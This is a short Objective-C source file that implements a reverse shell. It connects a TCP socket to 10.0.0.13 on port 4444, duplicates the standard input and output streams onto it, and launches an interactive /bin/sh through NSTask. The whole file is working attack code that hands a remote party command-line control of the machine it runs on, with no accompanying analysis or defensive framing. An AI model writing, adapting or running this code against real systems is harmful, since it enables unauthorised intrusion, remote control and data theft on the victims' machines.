// Objective-C reverse shell using NSTask
#import <Foundation/Foundation.h>
#import <sys/socket.h>
#import <netinet/in.h>
#import <arpa/inet.h>
#import <unistd.h>

int main(int argc, const char *argv[]) {
    @autoreleasepool {
        int s = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in sa;
        sa.sin_family = AF_INET;
        sa.sin_port = htons(4444);
        sa.sin_addr.s_addr = inet_addr("10.0.0.13");
        connect(s, (struct sockaddr *)&sa, sizeof(sa));
        dup2(s, 0);
        dup2(s, 1);
        dup2(s, 2);
        NSTask *task = [[NSTask alloc] init];
        [task setLaunchPath:@"/bin/sh"];
        [task setArguments:@[@"-i"]];
        [task launch];
        [task waitUntilExit];
    }
    return 0;
}
